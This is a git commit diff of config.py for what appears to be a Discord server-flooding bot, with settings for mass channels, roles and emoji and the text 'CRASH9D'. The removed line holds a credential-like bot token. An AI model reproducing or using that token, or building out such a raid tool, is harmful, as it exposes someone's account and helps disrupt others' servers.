84bb6df8adfb5407cc29911bec077fb30c776b57
TerminalPR0 <69242996+TerminalPR0@users.noreply.github.com>
2021-11-10 19:49:14 +0700

    Update config.py

--- config.py
+++ config.py
@@ -1,11 +1,10 @@
 settings = {
-	'TOKEN': 'ODMzOTcxMTMxNTI5ODIyMjI5.YH6GJA.gcqvgP92XgGbGZgOMfoD3GWnd8M',
+	'TOKEN': 'YOUR TOKEN',
 	'PREFIX': 't!',                     # Prefix
 	'TEXT-CHANNELS': 100,               # Max 250
 	'VOICE-CHANNELS': 100,              # Max 250
 	'ROLES': 100,                       # Max 250
 	'EMOJI': 50,                       # Max 50
 	'TEXT': 'CRASH9D',                     # Some text
-	'ICON-PNG': 'pic.png',             # Path to png/jpeg picture
-	'WEBHOOK': '',     # Your webhook
+	'ICON-PNG': 'pic.png'            # Path to png/jpeg picture
 }
